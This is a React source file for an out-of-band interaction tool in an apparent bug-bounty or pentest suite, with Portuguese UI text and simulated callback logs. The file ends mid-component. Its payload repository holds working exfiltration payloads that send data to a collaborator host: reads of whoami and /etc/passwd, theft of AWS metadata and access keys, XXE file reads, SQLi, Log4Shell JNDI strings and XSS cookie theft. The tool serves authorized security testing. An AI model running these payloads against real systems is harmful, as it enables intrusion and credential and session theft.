import React, { useState, useMemo, useEffect } from 'react';
import { 
  Radio, 
  Terminal, 
  Copy, 
  Check, 
  Download, 
  RefreshCw, 
  Send, 
  ShieldAlert, 
  Globe, 
  Search, 
  Binary, 
  FileCode, 
  Layers, 
  Sparkles,
  CheckCircle2,
  AlertTriangle,
  ArrowRight,
  Database,
  Cloud,
  FileText,
  Pause,
  Play,
  Trash2,
  Filter,
  Info,
  Eye,
  ExternalLink,
  Code2,
  Server,
  Lock,
  Mail,
  X
} from 'lucide-react';

export interface OobInteraction {
  id: string;
  timestamp: string;
  protocol: 'DNS' | 'HTTP' | 'HTTPS' | 'LDAP' | 'SMTP';
  sourceIp: string;
  sourceReverseDns?: string;
  geoEstimate?: string;
  subdomainOrPath: string;
  httpMethod?: 'GET' | 'POST' | 'PUT' | 'HEAD' | 'OPTIONS';
  queryParameters?: Record<string, string>;
  headers?: Record<string, string>;
  requestBody?: string;
  dataExfiltrated?: string;
  decodedData?: string;
  correlatedTag?: string;
}

interface OobInteractionStudioProps {
  initialTarget?: string;
  onSendToPocBuilder?: (url: string, payload?: string) => void;
}

export const OobInteractionStudio: React.FC<OobInteractionStudioProps> = ({
  initialTarget,
  onSendToPocBuilder
}) => {
  // Token & Collaborator Host Configuration
  const [tokenPrefix, setTokenPrefix] = useState<string>('recon');
  const [tokenRandom, setTokenRandom] = useState<string>(() => Math.random().toString(36).substring(2, 8));
  const [selectedServerDomain, setSelectedServerDomain] = useState<string>('oob.bugsentinel.internal');
  const [customServerDomain, setCustomServerDomain] = useState<string>('');
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  // Active category for attack payload generation
  const [selectedCategory, setSelectedCategory] = useState<'dns' | 'http' | 'ssrf' | 'xxe' | 'rce' | 'sqli' | 'jndi' | 'xss'>('dns');

  // Logs state & filters
  const [isCapturing, setIsCapturing] = useState<boolean>(true);
  const [protocolFilter, setProtocolFilter] = useState<'ALL' | 'DNS' | 'HTTP' | 'HTTPS' | 'LDAP' | 'SMTP'>('ALL');
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [selectedInteraction, setSelectedInteraction] = useState<OobInteraction | null>(null);

  // Decoder workbench
  const [decoderInput, setDecoderInput] = useState<string>('726f6f742d75736572');
  const [decoderMode, setDecoderMode] = useState<'hex-dns' | 'base64' | 'url'>('hex-dns');

  // Compute full collaborator identifier
  const activeDomain = useMemo(() => {
    const domain = selectedServerDomain === 'custom' && customServerDomain.trim()
      ? customServerDomain.trim().toLowerCase()
      : selectedServerDomain;
    const cleanPrefix = tokenPrefix.trim().replace(/[^a-zA-Z0-9_-]/g, '') || 'oob';
    return `${cleanPrefix}-${tokenRandom}.${domain}`;
  }, [tokenPrefix, tokenRandom, selectedServerDomain, customServerDomain]);

  // Seed default interactions
  const [interactions, setInteractions] = useState<OobInteraction[]>([
    {
      id: 'int-001',
      timestamp: '2026-09-23 10:14:02 UTC',
      protocol: 'DNS',
      sourceIp: '198.51.100.44',
      sourceReverseDns: 'resolver.corp-outbound.net',
      geoEstimate: 'US (AWS us-east-1)',
      subdomainOrPath: `726f6f74.${activeDomain}`,
      dataExfiltrated: '726f6f74',
      decodedData: 'root (Hex decoded)',
      correlatedTag: 'recon-rce'
    },
    {
      id: 'int-002',
      timestamp: '2026-09-23 10:14:05 UTC',
      protocol: 'HTTP',
      sourceIp: '198.51.100.44',
      sourceReverseDns: 'nat-gateway.corp-outbound.net',
      geoEstimate: 'US (AWS us-east-1)',
      httpMethod: 'GET',
      subdomainOrPath: `/callback?token=${tokenRandom}&user=root&arch=x86_64`,
      queryParameters: {
        token: tokenRandom,
        user: 'root',
        arch: 'x86_64'
      },
      headers: {
        'User-Agent': 'curl/8.4.0',
        'Host': activeDomain,
        'Accept': '*/*',
        'X-Forwarded-For': '10.0.12.55'
      },
      dataExfiltrated: 'user=root&arch=x86_64',
      decodedData: 'User: root | Arch: x86_64',
      correlatedTag: 'recon-http'
    },
    {
      id: 'int-003',
      timestamp: '2026-09-23 10:15:30 UTC',
      protocol: 'HTTPS',
      sourceIp: '203.0.113.88',
      sourceReverseDns: 'webhook-worker.target-infra.cloud',
      geoEstimate: 'DE (Frankfurt)',
      httpMethod: 'POST',
      subdomainOrPath: `/api/v1/pingback?ref=ssrf-check`,
      queryParameters: {
        ref: 'ssrf-check'
      },
      headers: {
        'User-Agent': 'Java/17.0.8 (Apache-HttpClient/4.5.14)',
        'Host': activeDomain,
        'Content-Type': 'application/json',
        'X-Originating-IP': '10.200.4.12'
      },
      requestBody: JSON.stringify({
        status: 'received',
        backendNode: 'internal-worker-03',
        iamRole: 'arn:aws:iam::123456789012:role/WorkerNodeRole'
      }, null, 2),
      dataExfiltrated: 'WorkerNodeRole',
      decodedData: 'IAM Role: WorkerNodeRole',
      correlatedTag: 'ssrf-webhook'
    }
  ]);

  const regenerateToken = () => {
    const newRandom = Math.random().toString(36).substring(2, 8);
    setTokenRandom(newRandom);
  };

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  // Trigger simulated interaction
  const triggerSimulation = (type: 'DNS' | 'HTTP_GET' | 'HTTP_POST' | 'LDAP') => {
    if (!isCapturing) {
      setIsCapturing(true);
    }
    const now = new Date();
    const timeStr = `${now.toISOString().replace('T', ' ').substring(0, 19)} UTC`;
    const randIp = `198.51.100.${Math.floor(Math.random() * 200) + 10}`;

    let newInt: OobInteraction;

    if (type === 'DNS') {
      newInt = {
        id: `int-${Date.now()}`,
        timestamp: timeStr,
        protocol: 'DNS',
        sourceIp: randIp,
        sourceReverseDns: `dns-resolver-${randIp.replace(/\./g, '-')}.isp.net`,
        geoEstimate: 'BR (São Paulo Edge)',
        subdomainOrPath: `exfil-admin-61646d696e.${activeDomain}`,
        dataExfiltrated: '61646d696e',
        decodedData: 'admin (Hex Decoded)',
        correlatedTag: tokenPrefix
      };
    } else if (type === 'HTTP_GET') {
      newInt = {
        id: `int-${Date.now()}`,
        timestamp: timeStr,
        protocol: 'HTTP',
        sourceIp: randIp,
        sourceReverseDns: `ip-${randIp.replace(/\./g, '-')}.compute.internal`,
        geoEstimate: 'US (Northern Virginia)',
        httpMethod: 'GET',
        subdomainOrPath: `/ssrf/trigger?host=${initialTarget || 'target-api.corp'}&token=${tokenRandom}`,
        queryParameters: {
          host: initialTarget || 'target-api.corp',
          token: tokenRandom,
          timestamp: Date.now().toString()
        },
        headers: {
          'User-Agent': 'Mozilla/5.0 (compatible; HeadlessChrome/120.0)',
          'Host': activeDomain,
          'Accept': 'text/html,application/xhtml+xml',
          'X-Forwarded-For': '10.50.100.22'
        },
        dataExfiltrated: 'token=' + tokenRandom,
        decodedData: `Verified SSRF callback from ${initialTarget || 'target-api.corp'}`,
        correlatedTag: tokenPrefix
      };
    } else if (type === 'HTTP_POST') {
      newInt = {
        id: `int-${Date.now()}`,
        timestamp: timeStr,
        protocol: 'HTTPS',
        sourceIp: randIp,
        sourceReverseDns: `proxy-gateway.${randIp.replace(/\./g, '-')}.corp`,
        geoEstimate: 'EU (Dublin)',
        httpMethod: 'POST',
        subdomainOrPath: `/webhook/data-exfiltration`,
        queryParameters: {
          src: 'pdf-renderer'
        },
        headers: {
          'User-Agent': 'WeasyPrint/59.0 (Linux x86_64)',
          'Host': activeDomain,
          'Content-Type': 'application/json',
          'X-Request-ID': `req-${Date.now()}`
        },
        requestBody: JSON.stringify({
          alert: 'OOB interaction detected',
          environment: 'production-vpc',
          caller: 'Microservice-Billing'
        }, null, 2),
        dataExfiltrated: 'Microservice-Billing',
        decodedData: 'Microservice-Billing internal caller',
        correlatedTag: tokenPrefix
      };
    } else {
      newInt = {
        id: `int-${Date.now()}`,
        timestamp: timeStr,
        protocol: 'LDAP',
        sourceIp: randIp,
        sourceReverseDns: `java-app-server.${randIp.replace(/\./g, '-')}.corp`,
        geoEstimate: 'US (Oregon)',
        subdomainOrPath: `ldap://${activeDomain}:1389/ExploitObject`,
        headers: {
          'Java-Version': '11.0.19',
          'Vendor': 'Oracle Corporation',
          'Caller-Class': 'org.apache.logging.log4j.core.net.JndiManager'
        },
        dataExfiltrated: 'Java 11.0.19',
        decodedData: 'Confirmed Log4j JNDI lookup trigger',
        correlatedTag: tokenPrefix
      };
    }

    setInteractions(prev => [newInt, ...prev]);
  };

  // Filtered interactions
  const filteredInteractions = useMemo(() => {
    return interactions.filter(item => {
      if (protocolFilter !== 'ALL' && item.protocol !== protocolFilter) return false;
      if (searchQuery.trim()) {
        const q = searchQuery.toLowerCase();
        const matches = 
          item.sourceIp.toLowerCase().includes(q) ||
          item.subdomainOrPath.toLowerCase().includes(q) ||
          (item.dataExfiltrated && item.dataExfiltrated.toLowerCase().includes(q)) ||
          (item.decodedData && item.decodedData.toLowerCase().includes(q)) ||
          (item.correlatedTag && item.correlatedTag.toLowerCase().includes(q)) ||
          (item.requestBody && item.requestBody.toLowerCase().includes(q));
        if (!matches) return false;
      }
      return true;
    });
  }, [interactions, protocolFilter, searchQuery]);

  // Decode data
  const decodedResult = useMemo(() => {
    const input = decoderInput.trim();
    if (!input) return '';
    try {
      if (decoderMode === 'hex-dns') {
        let clean = input.replace(/[^0-9a-fA-F]/g, '');
        let str = '';
        for (let i = 0; i < clean.length; i += 2) {
          str += String.fromCharCode(parseInt(clean.substr(i, 2), 16));
        }
        return str || 'Entrada hexadecimal inválida';
      }
      if (decoderMode === 'base64') {
        return atob(input);
      }
      if (decoderMode === 'url') {
        return decodeURIComponent(input);
      }
    } catch (e) {
      return 'Erro na decodificação: verifique o formato dos dados.';
    }
    return '';
  }, [decoderInput, decoderMode]);

  // Payloads repository tailored to active collaborator domain
  const payloads = useMemo(() => {
    const host = activeDomain;
    return {
      dns: {
        title: 'DNS Interaction & Resolution Testing',
        description: 'Testa resolução recursiva de nomes DNS. Ideal quando conexões HTTP externas estão bloqueadas por regras de saída (Egress Filtering), mas consultas DNS na porta UDP/53 passam pelo resolvedor interno.',
        items: [
          {
            label: '1. Teste Básico de Resolução (nslookup / dig)',
            command: `nslookup ${host}\n# Ou com dig:\ndig +short ${host}`,
            explanation: 'Gera uma consulta de registro A. Se o resolvedor corporativo contatar seu servidor, o IP e o timestamp do DNS serão registrados.'
          },
          {
            label: '2. Exfiltração de Dados via Subdomínio (Linux Bash)',
            command: `nslookup $(whoami).${host}\n# Ou com ping ICMP:\nping -c 1 $(id -u).${host}`,
            explanation: 'Injeta o resultado do comando no prefixo do hostname. O resolvedor DNS transmite o dado exfiltrado até o seu painel.'
          },
          {
            label: '3. Exfiltração de Dados via Subdomínio (Windows CMD/PowerShell)',
            command: `for /f %i in ('whoami') do nslookup %i.${host}\n# PowerShell:\nResolve-DnsName -Name "$($env:USERNAME).${host}"`,
            explanation: 'Resolve o nome do usuário local e o transmite através da árvore de delegação DNS autoritativa.'
          }
        ]
      },
      http: {
        title: 'HTTP / HTTPS Interaction & Webhook Testing',
        description: 'Valida se serviços internos efetuam chamadas HTTP ou HTTPS para servidores externos (Pingbacks, Webhooks, Avatar Preview, PDF Generators).',
        items: [
          {
            label: '1. Chamada HTTP Simples com Tag de Rastreamento',
            command: `curl -i -s "http://${host}/ping?tag=${tokenPrefix}&ts=\$(date +%s)"`,
            explanation: 'Gera uma requisição HTTP GET na porta 80. O IP de saída e o User-Agent do servidor de aplicação serão capturados.'
          },
          {
            label: '2. Requisição HTTPS com Payload JSON (Webhook Test)',
            command: `curl -i -X POST "https://${host}/webhook" \\\n  -H "Content-Type: application/json" \\\n  -d '{"client": "${tokenPrefix}", "timestamp": "\$(date +%s)"}'`,
            explanation: 'Verifica se o servidor aceita certificados TLS externos e envia o corpo da requisição.'
          },
          {
            label: '3. Injeção em Cabeçalhos de Proxy (Header Blind Injection)',
            command: `curl -i "https://${initialTarget || 'alvo.com'}/api" \\\n  -H "X-Forwarded-For: ${host}" \\\n  -H "X-Real-IP: ${host}" \\\n  -H "Referer: http://${host}/ref" \\\n  -H "User-Agent: Mozilla/5.0 (compatible; Pingback-Test http://${host}/bot)"`,
            explanation: 'Injeta o domínio OOB em múltiplos cabeçalhos analisados por gateways, proxies reversos e sistemas de telemetria.'
          }
        ]
      },
      ssrf: {
        title: 'Blind SSRF (Server-Side Request Forgery)',
        description: 'Verifica se o backend processa URLs enviadas pelo usuário e efetua requisições na rede interna ou externa.',
        items: [
          {
            label: '1. Parâmetro de URL / Webhook Subscribe',
            command: `curl -i -X POST "https://${initialTarget || 'api.alvo.com'}/v1/subscribe" \\\n  -H "Content-Type: application/json" \\\n  -d '{"webhook_url": "http://${host}/ssrf-callback"}'`,
            explanation: 'Se a API disparar uma requisição de confirmação, o callback OOB registrará o IP real do cluster de workers.'
          },
          {
            label: '2. Leitura de Metadados de Nuvem (AWS IMDSv1 Exfiltração)',
            command: `curl -i "https://${initialTarget || 'api.alvo.com'}/preview?url=http://${host}/?leak=\$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)"`,
            explanation: 'Em cenários de RCE encadeado com SSRF, o script extrai o nome da role IAM e anexa à query string do Collaborator.'
          }
        ]
      },
      xxe: {
        title: 'Blind XXE (XML External Entity Out-of-Band)',
        description: 'Força o parser XML desprotegido a consultar uma entidade DTD externa hospedada no Collaborator.',
        items: [
          {
            label: '1. Injeção de Entidade de Parâmetro XML (DTD Externa)',
            command: `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM "http://${host}/eval.dtd">\n  %remote;\n  %eval;\n  %exfil;\n]>\n<root><data>test</data></root>`,
            explanation: 'Injeta um documento XML no endpoint vulnerável requisitando o arquivo DTD de parametrização externa.'
          },
          {
            label: '2. Arquivo DTD Simulado para Exfiltração de Arquivo',
            command: `<!-- Conteúdo retornado pelo Collaborator em http://${host}/eval.dtd -->\n<!ENTITY % file SYSTEM "file:///etc/hostname">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://${host}/?x=%file;'>">`,
            explanation: 'Lê o arquivo interno e submete o conteúdo codificado via query string HTTP para o seu domínio.'
          }
        ]
      },
      rce: {
        title: 'Blind Command Injection (DNS & HTTP Tunneling)',
        description: 'Comprova a execução remota de código sem saída refletida utilizando túneis DNS ou requisições cURL/Wget.',
        items: [
          {
            label: '1. Linux — DNS Exfiltration com Base64 ou Hex',
            command: `ping -c 1 \`whoami\`.${host}\n# Para saídas complexas:\ncurl -s "http://${host}/?exfil=\$(cat /etc/passwd | head -n 3 | base64 | tr -d '\\n')"`,
            explanation: 'Envia dados do sistema operacional concatenados na requisição externa.'
          },
          {
            label: '2. Windows — Certutil / PowerShell Download & Ping',
            command: `certutil -urlcache -split -f "http://${host}/win-ping"\n# Ou PowerShell:\nInvoke-WebRequest -Uri "http://${host}/?u=$($env:USERNAME)"`,
            explanation: 'Ferramentas nativas do Windows (*Living off the Land*) usadas para forçar conexões de saída.'
          }
        ]
      },
      sqli: {
        title: 'Blind SQL Injection Out-of-Band (OOB-SQLi)',
        description: 'Aciona funções de banco de dados que geram resoluções de nomes ou conexões SMB/HTTP para demonstrar SQLi cego.',
        items: [
          {
            label: '1. Microsoft SQL Server (master..xp_dirtree)',
            command: `'; EXEC master..xp_dirtree '\\\\${host}\\share'--`,
            explanation: 'Gera uma tentativa de autenticação SMB ou consulta DNS para o hostname alvo, comprovando a injeção SQL.'
          },
          {
            label: '2. Oracle Database (UTL_INADDR.get_host_address)',
            command: `' UNION SELECT UTL_INADDR.get_host_address('${host}') FROM dual--`,
            explanation: 'Força o banco Oracle a resolver o endereço IP do seu domínio Collaborator.'
          },
          {
            label: '3. PostgreSQL (COPY ... PROGRAM)',
            command: `'; COPY (SELECT '') to PROGRAM 'nslookup \`whoami\`.${host}'--`,
            explanation: 'Executa o binário nslookup diretamente do processo postgres quando privilégios de superuser estão presentes.'
          }
        ]
      },
      jndi: {
        title: 'Log4Shell & JNDI Injection Suite',
        description: 'Vulnerabilidades em parsers Java (CVE-2021-44228) que avaliam expressões JNDI arbitrárias.',
        items: [
          {
            label: '1. Payload LDAP Padrão',
            command: `\${jndi:ldap://${host}:1389/ExploitObject}`,
            explanation: 'Força o motor JNDI a estabelecer conexão LDAP remota para a porta 1389.'
          },
          {
            label: '2. Payload DNS Exfiltration de Propriedades Java',
            command: `\${jndi:dns://${host}/\${sys:user.name}}`,
            explanation: 'Resolve o nome do usuário do processo Java como subdomínio DNS do Collaborator.'
          },
          {
            label: '3. Exfiltração de Variáveis de Ambiente de Nuvem',
            command: `\${jndi:ldap://\${env:AWS_ACCESS_KEY_ID}.${host}:1389/a}`,
            explanation: 'Concatena chaves de acesso AWS no cabeçalho da consulta LDAP remota.'
          }
        ]
      },
      xss: {
        title: 'Blind XSS (Cross-Site Scripting OOB)',
        description: 'Injeta payloads de script ou imagem que são armazenados em painéis restritos (Admin / CRM / Helpdesk) e disparam quando visualizados por outro usuário.',
        items: [
          {
            label: '1. Payload de Imagem OOB com Cookie Exfiltração',
            command: `<img src=x onerror="fetch('https://${host}/xss?c='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(location.href))">`,
            explanation: 'Dispara uma requisição fetch contendo cookies de sessão e a URL interna do painel administrativo.'
          },
          {
            label: '2. Tag Script Externa para Carregamento de Hook',
            command: `<script src="https://${host}/hook.js"></script>`,
            explanation: 'Tenta carregar um script remoto. Se o firewall do navegador (CSP) permitir, o log de requisição confirmará a execução.'
          }
        ]
      }
    };
  }, [activeDomain, tokenPrefix, initialTarget]);

  // Export logs to JSON
  const exportLogsAsJson = () => {
    const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(interactions, null, 2));
    const dlAnchor = document.createElement('a');
    dlAnchor.setAttribute('href', dataStr);
    dlAnchor.setAttribute('download', `oob-collaborator-logs-${activeDomain}.json`);
    dlAnchor.click();
  };

  // Export logs to CSV
  const exportLogsAsCsv = () => {
    const headers = ['ID', 'Timestamp', 'Protocol', 'Source IP', 'Reverse DNS', 'Geo', 'Subdomain / Path', 'Exfiltrated Data', 'Decoded Data'];
    const rows = interactions.map(i => [
      i.id,
      `"${i.timestamp}"`,
      i.protocol,
      i.sourceIp,
      `"${i.sourceReverseDns || ''}"`,
      `"${i.geoEstimate || ''}"`,
      `"${i.subdomainOrPath.replace(/"/g, '""')}"`,
      `"${(i.dataExfiltrated || '').replace(/"/g, '""')}"`,
      `"${(i.decodedData || '').replace(/"/g, '""')}"`
    ]);
    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map(e => e.join(','))].join('\n');
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `oob-collaborator-logs-${activeDomain}.csv`);
    link.click();
  };

  const copyMarkdownEvidence = (interaction: OobInteraction) => {
    const md = `### Evidência de Interação Out-of-Band (OOB Collaborator)
- **ID da Interação:** \`${interaction.id}\`
- **Protocolo:** \`${interaction.protocol}\`
- **Data/Hora:** \`${interaction.timestamp}\`
- **IP de Origem:** \`${interaction.sourceIp}\` (${interaction.sourceReverseDns || 'N/A'})
- **Estimativa de Localização:** ${interaction.geoEstimate || 'N/A'}
- **Destino Requisitado:** \`${interaction.subdomainOrPath}\`
${interaction.dataExfiltrated ? `- **Dado Exfiltrado:** \`${interaction.dataExfiltrated}\`` : ''}
${interaction.decodedData ? `- **Dado Decodificado:** \`${interaction.decodedData}\`` : ''}
${interaction.headers ? `\n#### Cabeçalhos HTTP:\n\`\`\`http\n${Object.entries(interaction.headers).map(([k, v]) => `${k}: ${v}`).join('\n')}\n\`\`\`` : ''}
${interaction.requestBody ? `\n#### Corpo da Requisição:\n\`\`\`json\n${interaction.requestBody}\n\`\`\`` : ''}
`;
    copyToClipboard(md, `md-${interaction.id}`);
  };

  return (
    <div className="space-y-6">
      {/* Top Banner */}
      <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-6 relative overflow-hidden">
        <div className="absolute -right-8 -bottom-8 w-64 h-64 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none" />
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-5">
          <div className="space-y-1.5">
            <div className="flex items-center gap-2">
              <span className="px-2.5 py-0.5 rounded-full bg-cyan-500/15 border border-cyan-500/30 text-cyan-400 font-mono text-xs font-bold flex items-center gap-1.5">
                <Radio className="w-3.5 h-3.5 animate-pulse" />
                <span>OOB (Out-of-Band) Collaborator</span>
              </span>
              <span className="text-zinc-500 text-xs">•</span>
              <span className="text-zinc-400 font-mono text-xs">DNS & HTTP External Interaction Engine</span>
            </div>
            <h2 className="text-2xl font-bold text-white tracking-tight flex items-center gap-2">
              <span>Central Collaborator para Testes Fora-de-Banda (OOB)</span>
            </h2>
            <p className="text-xs sm:text-sm text-zinc-400 max-w-3xl leading-relaxed">
              Gere identificadores e domínios únicos para comprovação empírica de vulnerabilidades cegas (Blind SSRF, Blind XXE, Blind RCE, Blind SQLi, Log4j e Blind XSS). Monitore em tempo real registros de consultas DNS na porta 53 e requisições HTTP/HTTPS com dados exfiltrados.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2 shrink-0">
            <button
              type="button"
              onClick={regenerateToken}
              className="px-3.5 py-2 rounded-xl bg-[#1b1b26] hover:bg-[#252536] text-zinc-200 border border-[#2a2a3e] text-xs font-mono font-bold flex items-center gap-1.5 transition-all cursor-pointer shadow-sm"
              title="Gerar novo identificador aleatório"
            >
              <RefreshCw className="w-3.5 h-3.5 text-cyan-400" />
              <span>Gerar Novo Token</span>
            </button>

            <button
              type="button"
              onClick={() => setIsCapturing(!isCapturing)}
              className={`px-3.5 py-2 rounded-xl border text-xs font-mono font-bold flex items-center gap-1.5 transition-all cursor-pointer ${
                isCapturing 
                  ? 'bg-emerald-500/15 text-emerald-300 border-emerald-500/30 hover:bg-emerald-500/25'
                  : 'bg-amber-500/15 text-amber-300 border-amber-500/30 hover:bg-amber-500/25'
              }`}
            >
              {isCapturing ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
              <span>{isCapturing ? 'Captura Ativa' : 'Captura Pausada'}</span>
            </button>
          </div>
        </div>
      </div>

      {/* Unique Collaborator Domain Generator Panel */}
      <div className="bg-[#151520] border border-[#222234] rounded-2xl p-5 space-y-4">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div className="space-y-1">
            <span className="text-[11px] font-mono font-bold text-cyan-400 uppercase tracking-wider flex items-center gap-1.5">
              <Server className="w-3.5 h-3.5" />
              <span>Domínio Ativo de Escuta OOB (Unique Hostname):</span>
            </span>
            <div className="flex items-center gap-2 flex-wrap">
              <code className="text-base sm:text-lg font-mono font-bold text-white bg-[#0b0b10] px-4 py-1.5 rounded-xl border border-[#2a2a3e] select-all">
                {activeDomain}
              </code>
              <button
                type="button"
                onClick={() => copyToClipboard(activeDomain, 'active-domain')}
                className="p-2 rounded-xl bg-[#20202e] hover:bg-[#2a2a3e] text-zinc-300 transition-all border border-[#2e2e42] cursor-pointer"
                title="Copiar Hostname"
              >
                {copiedKey === 'active-domain' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
              </button>
              <button
                type="button"
                onClick={() => copyToClipboard(`http://${activeDomain}`, 'active-http')}
                className="px-2.5 py-1.5 rounded-xl bg-[#20202e] hover:bg-[#2a2a3e] text-cyan-300 transition-all border border-[#2e2e42] text-xs font-mono font-bold cursor-pointer"
                title="Copiar URL HTTP"
              >
                {copiedKey === 'active-http' ? 'Copiado!' : 'http://'}
              </button>
              <button
                type="button"
                onClick={() => copyToClipboard(`https://${activeDomain}`, 'active-https')}
                className="px-2.5 py-1.5 rounded-xl bg-[#20202e] hover:bg-[#2a2a3e] text-emerald-300 transition-all border border-[#2e2e42] text-xs font-mono font-bold cursor-pointer"
                title="Copiar URL HTTPS"
              >
                {copiedKey === 'active-https' ? 'Copiado!' : 'https://'}
              </button>
            </div>
          </div>

          {/* Quick Stats / Protocol Ports */}
          <div className="flex flex-wrap items-center gap-2 text-[11px] font-mono text-zinc-400 self-start md:self-auto">
            <span className="bg-[#1b1b26] px-2.5 py-1 rounded-lg border border-[#28283a] flex items-center gap-1">
              <span className="w-1.5 h-1.5 rounded-full bg-cyan-400" />
              DNS: <strong>UDP/53</strong>
            </span>
            <span className="bg-[#1b1b26] px-2.5 py-1 rounded-lg border border-[#28283a] flex items-center gap-1">
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
              HTTP: <strong>TCP/80</strong>
            </span>
            <span className="bg-[#1b1b26] px-2.5 py-1 rounded-lg border border-[#28283a] flex items-center gap-1">
              <span className="w-1.5 h-1.5 rounded-full bg-green-400" />
              HTTPS: <strong>TCP/443</strong>
            </span>
            <span className="bg-[#1b1b26] px-2.5 py-1 rounded-lg border border-[#28283a] flex items-center gap-1">
              <span className="w-1.5 h-1.5 rounded-full bg-purple-400" />
              LDAP: <strong>TCP/1389</strong>
            </span>
          </div>
        </div>

        {/* Configuration Accordion/Inputs */}
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 pt-3 border-t border-[#222234] text-xs font-mono">
          <div>
            <label className="text-zinc-400 font-bold block mb-1">Prefixo / Tag do Teste (Correlação):</label>
            <input
              type="text"
              value={tokenPrefix}
              onChange={(e) => setTokenPrefix(e.target.value.toLowerCase().replace(/[^a-z0-9_-]/g, ''))}
              placeholder="ex: recon, ssrf-api, auth-test"
              className="w-full bg-[#0e0e14] border border-[#28283a] rounded-lg px-3 py-1.5 text-white font-mono focus:outline-none focus:border-cyan-500"
            />
          </div>

          <div>
            <label className="text-zinc-400 font-bold block mb-1">Servidor Base OOB:</label>
            <select
              value={selectedServerDomain}
              onChange={(e) => setSelectedServerDomain(e.target.value)}
              className="w-full bg-[#0e0e14] border border-[#28283a] rounded-lg px-3 py-1.5 text-white font-mono focus:outline-none focus:border-cyan-500"
            >
              <option value="oob.bugsentinel.internal">oob.bugsentinel.internal (Padrão Suite)</option>
              <option value="interact.sh">interact.sh (ProjectDiscovery Open Server)</option>
              <option value="burpcollaborator.net">burpcollaborator.net (PortSwigger)</option>
              <option value="custom">Servidor Próprio / Custom FQDN</option>
            </select>
          </div>

          {selectedServerDomain === 'custom' && (
            <div>
              <label className="text-zinc-400 font-bold block mb-1">FQDN do Servidor Customizado:</label>
              <input
                type="text"
                value={customServerDomain}
                onChange={(e) => setCustomServerDomain(e.target.value)}
                placeholder="ex: collab.meudominio.com"
                className="w-full bg-[#0e0e14] border border-[#28283a] rounded-lg px-3 py-1.5 text-white font-mono focus:outline-none focus:border-cyan-500"
              />
            </div>
          )}
        </div>
      </div>

      {/* Main Grid: Attack Payloads (7 Cols) + External Requests Logs (5 Cols) */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* Left Column: Payload Generator for DNS/HTTP Testing */}
        <div className="lg:col-span-7 space-y-4">
          <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-4">
            <div className="flex items-center justify-between pb-2 border-b border-[#1f1f2e]">
              <div className="flex items-center gap-2">
                <Code2 className="w-4 h-4 text-cyan-400" />
                <h3 className="text-sm font-bold text-white">Gerador de Payloads com Hostname Único</h3>
              </div>
              <span className="text-[11px] font-mono text-zinc-400">Pronto para Testes Manuais & Ferramental</span>
            </div>

            {/* Category Navigation Pills */}
            <div className="flex items-center gap-1.5 overflow-x-auto pb-1 scrollbar-none">
              {(['dns', 'http', 'ssrf', 'xxe', 'rce', 'sqli', 'jndi', 'xss'] as const).map(cat => {
                const labels: Record<string, string> = {
                  dns: 'DNS Resolution',
                  http: 'HTTP / Webhooks',
                  ssrf: 'Blind SSRF',
                  xxe: 'Blind XXE',
                  rce: 'Blind RCE',
                  sqli: 'Blind SQLi',
                  jndi: 'Log4j / JNDI',
                  xss: 'Blind XSS'
                };
                return (
                  <button
                    key={cat}
                    type="button"
                    onClick={() => setSelectedCategory(cat)}
                    className={`px-3 py-1.5 rounded-xl text-xs font-mono font-bold transition-all whitespace-nowrap cursor-pointer ${
                      selectedCategory === cat 
                        ? 'bg-cyan-500 text-black shadow-sm' 
                        : 'bg-[#181824] text-zinc-400 hover:text-white hover:bg-[#202030]'
                    }`}
                  >
                    {labels[cat]}
                  </button>
                );
              })}
            </div>

            {/* Category Description Banner */}
            <div className="p-3.5 rounded-xl bg-[#161622] border border-[#232336] space-y-1">
              <h4 className="text-xs font-bold text-white flex items-center gap-2">
                <span className="text-cyan-400 font-mono">[{selectedCategory.toUpperCase()}]</span>
                <span>{payloads[selectedCategory].title}</span>
              </h4>
              <p className="text-[11px] text-zinc-400 leading-relaxed">
                {payloads[selectedCategory].description}
              </p>
            </div>

            {/* Payload Items List */}
            <div className="space-y-3.5">
              {payloads[selectedCategory].items.map((item, idx) => (
                <div key={idx} className="bg-[#151520] border border-[#222232] rounded-xl p-3.5 space-y-2">
                  <div className="flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-300 font-bold">{item.label}</span>
                    <div className="flex items-center gap-1.5">
                      {onSendToPocBuilder && (
                        <button
                          type="button"
                          onClick={() => onSendToPocBuilder(`http://${activeDomain}`, item.command)}
                          className="px-2 py-0.5 rounded bg-indigo-950/60 hover:bg-indigo-900/80 text-indigo-300 border border-indigo-500/30 text-[10px] font-mono font-bold flex items-center gap-1 cursor-pointer transition-colors"
                          title="Enviar comando para o PoC Builder"
                        >
                          <Terminal className="w-3 h-3" />
                          <span>PoC Builder</span>
                        </button>
                      )}
                      <button
                        type="button"
                        onClick={() => copyToClipboard(item.command, `cmd-${selectedCategory}-${idx}`)}
